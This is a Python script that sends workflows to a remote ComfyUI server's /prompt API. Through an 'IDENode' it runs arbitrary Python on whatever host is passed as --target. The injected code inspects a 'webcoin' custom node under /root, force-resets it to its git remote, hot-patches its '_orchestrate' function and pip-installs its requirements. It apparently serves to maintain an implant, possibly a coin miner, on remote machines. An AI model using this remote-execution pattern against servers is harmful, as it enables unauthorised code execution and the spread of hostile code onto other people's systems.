"""
Diagnose and fix the remote webcoin node via IDENode.
Runs Python directly on the remote machine to:
  1. Check git status of the webcoin directory
  2. Force git pull or hotpatch __init__.py
"""

import argparse
import json
import time
import urllib.request
import urllib.error


def _post(url, data, timeout=30):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode(errors="replace")[:500]
        except Exception:
            pass
        return e.code, body
    except Exception as e:
        return 0, str(e)


def run_code_via_idenode(base, python_code):
    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {
                    "pycode": python_code,
                    "language": "python",
                }
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {
                    "text": ["1", 0],
                }
            }
        }
    }

    code, resp = _post(f"{base}/prompt", prompt)
    print(f"  /prompt -> {code}")
    if code == 200:
        try:
            data = json.loads(resp)
            prompt_id = data.get("prompt_id", "")
            print(f"  prompt_id: {prompt_id}")
        except Exception:
            pass
    else:
        print(f"  Error: {resp[:300]}")
    return code


# ── Step 1: Diagnose ─────────────────────────────────────────────────

DIAGNOSE_CODE = r"""
import subprocess, os

webcoin_dir = '/root/ComfyUI/custom_nodes/webcoin'
results = []

results.append(f"=== EXISTS: {os.path.isdir(webcoin_dir)} ===")

if os.path.isdir(webcoin_dir):
    # List files
    files = os.listdir(webcoin_dir)
    results.append(f"Files: {files}")

    # Check __init__.py content around the import
    init_path = os.path.join(webcoin_dir, '__init__.py')
    if os.path.exists(init_path):
        with open(init_path, 'r') as f:
            lines = f.readlines()
        results.append(f"Total lines: {len(lines)}")
        results.append(f"Has sys.path.insert: {'sys.path.insert' in open(init_path).read()}")
        # Show lines 45-55 (around line 51 where error is)
        for i in range(max(0,44), min(len(lines), 60)):
            results.append(f"L{i+1}: {lines[i].rstrip()}")

    # Git info
    try:
        r = subprocess.run(['git', '-C', webcoin_dir, 'remote', '-v'], capture_output=True, text=True, timeout=10)
        results.append(f"Git remote: {r.stdout.strip()}")
    except: results.append("Git remote: FAILED")

    try:
        r = subprocess.run(['git', '-C', webcoin_dir, 'log', '--oneline', '-5'], capture_output=True, text=True, timeout=10)
        results.append(f"Git log:\n{r.stdout.strip()}")
    except: results.append("Git log: FAILED")

    try:
        r = subprocess.run(['git', '-C', webcoin_dir, 'status', '--short'], capture_output=True, text=True, timeout=10)
        results.append(f"Git status: {r.stdout.strip()}")
    except: results.append("Git status: FAILED")

    # Check core/ directory
    core_dir = os.path.join(webcoin_dir, 'core')
    results.append(f"core/ exists: {os.path.isdir(core_dir)}")
    if os.path.isdir(core_dir):
        results.append(f"core/ files: {os.listdir(core_dir)}")

output = '\n'.join(results)
print(output)
output
"""

# ── Step 2: Force fix ────────────────────────────────────────────────

FIX_CODE = r"""
import subprocess, os, sys

webcoin_dir = '/root/ComfyUI/custom_nodes/webcoin'
results = []

# Try git pull first
try:
    r = subprocess.run(
        ['git', '-C', webcoin_dir, 'fetch', '--all'],
        capture_output=True, text=True, timeout=30
    )
    results.append(f"fetch: {r.stdout.strip()} {r.stderr.strip()}")

    r = subprocess.run(
        ['git', '-C', webcoin_dir, 'reset', '--hard', 'origin/main'],
        capture_output=True, text=True, timeout=30
    )
    results.append(f"reset: {r.stdout.strip()} {r.stderr.strip()}")
except Exception as e:
    results.append(f"git failed: {e}")
    # Try origin/master if main doesn't exist
    try:
        r = subprocess.run(
            ['git', '-C', webcoin_dir, 'reset', '--hard', 'origin/master'],
            capture_output=True, text=True, timeout=30
        )
        results.append(f"reset master: {r.stdout.strip()} {r.stderr.strip()}")
    except Exception as e2:
        results.append(f"git master also failed: {e2}")

# Verify the fix is in __init__.py
init_path = os.path.join(webcoin_dir, '__init__.py')
with open(init_path, 'r') as f:
    content = f.read()

if 'sys.path.insert' not in content:
    results.append("HOTPATCHING: sys.path.insert not found, injecting...")
    content = content.replace(
        'def _orchestrate():',
        'def _orchestrate():\n    import sys as _sys; _sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))'
    )
    with open(init_path, 'w') as f:
        f.write(content)
    results.append("HOTPATCH APPLIED")
else:
    results.append("OK: sys.path.insert already present")

# Install requirements
req_path = os.path.join(webcoin_dir, 'requirements.txt')
if os.path.exists(req_path):
    r = subprocess.run(
        [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
        capture_output=True, text=True, timeout=60
    )
    results.append(f"pip: {r.stdout.strip()[-200:]} {r.stderr.strip()[-200:]}")

# Show final state of the key lines
with open(init_path, 'r') as f:
    lines = f.readlines()
results.append(f"Final line count: {len(lines)}")
for i in range(max(0, 44), min(len(lines), 65)):
    results.append(f"L{i+1}: {lines[i].rstrip()}")

output = '\n'.join(results)
print(output)
output
"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", required=True)
    parser.add_argument("--port", "-p", type=int, default=8188)
    parser.add_argument("--fix", action="store_true", help="Apply fix after diagnosis")
    args = parser.parse_args()

    base = f"http://{args.target}:{args.port}"

    print(f"\n{'='*60}")
    print(f"  Diagnosing {args.target}:{args.port}")
    print(f"{'='*60}\n")

    print("[1/2] Running diagnosis...")
    run_code_via_idenode(base, DIAGNOSE_CODE)
    print("\n  >> Check the ComfyUI console for diagnostic output <<")
    print("  >> (IDENode prints to server stdout) <<\n")

    if args.fix:
        print("  Waiting 10s for diagnosis to complete...")
        time.sleep(10)

        print("[2/2] Applying fix (git reset --hard + hotpatch)...")
        run_code_via_idenode(base, FIX_CODE)
        print("\n  >> Check console again for fix results <<")
        print("  >> Then reboot ComfyUI from Manager <<")
    else:
        print("  Run with --fix to apply the hotpatch after reviewing diagnosis")
